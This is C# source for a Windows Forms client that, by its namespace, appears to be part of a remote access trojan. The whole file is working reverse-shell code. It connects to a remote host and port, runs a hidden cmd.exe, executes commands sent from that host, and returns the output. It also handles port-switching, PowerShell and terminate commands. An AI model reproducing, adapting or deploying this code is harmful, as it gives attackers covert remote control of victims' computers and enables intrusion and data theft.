using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TTYRatClient
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        private string remoteIp = "127.0.0.1";
        private int mainPort = 6666;
        private int waitingPort = 6667;
        private int searchPort = 6668;
        private int currentPort = 6666;
        

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            
        }
        
        private void launchButton_Click(object sender, EventArgs e)
        {
            remoteIp = ipBox.Text;
            currentPort = Int32.Parse(portBox.Text);
            ipBox.Text = ""; 
            portBox.Text = "";
            statusStrip1.Text = "Starting Client with " + remoteIp + " on port " + currentPort;
            RunServer(remoteIp, currentPort);
            System.Threading.Thread.Sleep(5000); //Wait 5 seconds//then try again
        }

        private void RunServer(string ip, int port)
        {
            
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {                   
                    tcpClient.Connect(ip, port);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception ) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    string cmd = strInput.ToString();
                    if (cmd.Contains("change " ))
                    {
                        treatPortChanging(cmd);
                        break;
                    }
                    else
                    {
                        
                        //   AJOUT DE COMMANDE //
                        if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                        if (strInput.ToString().LastIndexOf("powershell") >= 0) openApp();
                    
                        //   AJOUT DE COMMANDE //
                        processCmd.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                    
                }
                catch (Exception )
                {
                    Cleanup();
                    break;
                }
            }
            
        }

        
        private void treatPortChanging(string command)
        {
            string[] cmd = command.Split(' ');
            currentPort = Int32.Parse(cmd[1]);
            RunServer(remoteIp, currentPort);

        }
        
        private void openApp()
        {
            processCmd.StandardInput.WriteLine("powershell");
        }
        
        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception ) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ) { }

            }
        }
    }
}